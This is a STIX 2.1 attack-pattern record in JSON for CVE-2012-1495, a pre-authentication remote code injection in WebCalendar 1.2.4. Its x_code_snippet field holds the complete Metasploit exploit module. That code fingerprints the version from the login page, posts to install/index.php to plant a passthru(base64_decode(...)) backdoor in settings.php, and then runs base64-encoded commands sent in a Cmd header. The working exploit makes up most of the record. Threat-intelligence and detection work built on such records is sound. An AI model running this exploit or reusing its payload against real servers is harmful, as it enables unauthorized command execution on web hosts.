{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14357429-9d9d-46a6-b4f1-37289898772e",
    "created": "2024-08-14T17:00:51.898434Z",
    "modified": "2024-08-14T17:00:51.898438Z",
    "name": "\"WebCalendar 1.2.4 Pre-Auth Remote Code Injection\"",
    "description": " This module exploits a vulnerability found in k5n.us WebCalendar, version 1.2.4 or less.  If not removed, the settings.php script meant for installation can be update by an attacker, and then inject code in it.  This allows arbitrary code execution as www-data.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/webcalendar_settings_exec.rb",
            "external_id": "webcalendar_settings_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1495"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"WebCalendar 1.2.4 Pre-Auth Remote Code Injection\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in k5n.us WebCalendar, version 1.2.4 or\n        less.  If not removed, the settings.php script meant for installation can be\n        update by an attacker, and then inject code in it.  This allows arbitrary code\n        execution as www-data.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'EgiX',   #Initial discovery & PoC\n          'sinn3r'  #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-1495'],\n          ['OSVDB', '81329'],\n          ['EDB', '18775']\n        ],\n      'Arch'           => ARCH_CMD,\n      'Platform'       => %w{ linux unix },\n      'Compat'         =>\n        {\n          'PayloadType' => 'cmd'\n        },\n      'Targets'        =>\n        [\n          ['WebCalendar 1.2.4 on Linux', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-04-23',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The URI path to webcalendar', '/WebCalendar-1.2.4/'])\n        ])\n  end\n\n  def check\n    uri = normalize_uri(target_uri.path)\n    uri << '/' if uri[-1, 1] != '/'\n\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => \"#{uri}/login.php\"\n    })\n\n    if res and res.body =~ /WebCalendar v1\\.2\\.\\d/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  def exploit\n    peer = \"#{rhost}:#{rport}\"\n\n    uri = target_uri.path\n\n    print_status(\"Housing php payload...\")\n\n    # Allow commands to be passed as a header.\n    # We use 'data' instead of 'vars_post to avoid the MSF API escapeing our stuff.\n    post_data  = \"app_settings=1\"\n    post_data << \"&form_user_inc=user.php\"\n    post_data << \"&form_single_user_login=*/print(____);passthru(base64_decode($_SERVER[HTTP_CMD]));die;\"\n    post_data << \"\\n\"*2\n    send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(uri, 'install/index.php'),\n      'data'      => post_data\n    })\n\n    print_status(\"Loading our payload...\")\n\n    # Execute our payload\n    send_request_raw({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'includes/settings.php'),\n      'headers' => {\n        'Cmd' => Rex::Text.encode_base64(payload.encoded)\n      }\n    })\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-04-23",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}